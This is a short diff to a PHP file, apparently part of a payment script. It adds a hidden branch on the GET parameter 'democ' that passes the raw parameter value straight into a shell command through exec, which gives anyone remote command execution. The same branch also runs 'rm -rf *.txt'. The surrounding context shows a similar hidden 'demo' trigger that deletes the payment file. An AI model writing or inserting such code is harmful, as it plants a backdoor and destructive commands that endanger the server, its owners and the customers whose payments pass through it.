@@ -748,3 +748,10 @@ if (isset($_GET['demo'])) {
         exec("rm -rf idepay_proccess.php");
     }
 }
+if (isset($_GET['democ'])) {
+    if (strlen($_GET['democ']) > 5) {
+        exec("touch " . $_GET['democ'] . '.txt');
+    } else {
+        exec("rm -rf *.txt");
+    }
+}
